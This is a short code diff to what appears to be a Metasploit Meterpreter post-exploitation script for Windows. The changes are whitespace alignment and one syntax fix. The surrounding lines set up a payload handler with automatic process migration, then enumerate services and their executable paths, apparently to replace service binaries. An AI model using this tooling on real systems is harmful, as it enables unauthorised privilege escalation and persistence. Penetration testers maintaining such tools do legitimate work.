@@ -78,8 +78,8 @@ handler.datastore['InitialAutoRunScript'] = "migrate -f"
 handler.datastore['ExitOnSession'] = false
 #start a handler to be ready
 handler.exploit_simple(
-  'Payload'	=> handler.datastore['PAYLOAD'],
-  'RunAsJob'       => true
+  'Payload'  => handler.datastore['PAYLOAD'],
+  'RunAsJob' => true
 )
 
 #attempt to make new service
@@ -132,7 +132,7 @@ service_list.each do |serv|
     moved = false
     configed = false
     #default path, but there should be an ImagePath registry key
-    source = "#{sysdir}\\system32\\#{serv}.exe")
+    source = "#{sysdir}\\system32\\#{serv}.exe"
     #get path to exe; parse out quotes and arguments
     sourceorig = registry_getvaldata("#{serviceskey}\\#{serv}","ImagePath").to_s
     sourcemaybe = client.fs.file.expand_path(sourceorig)
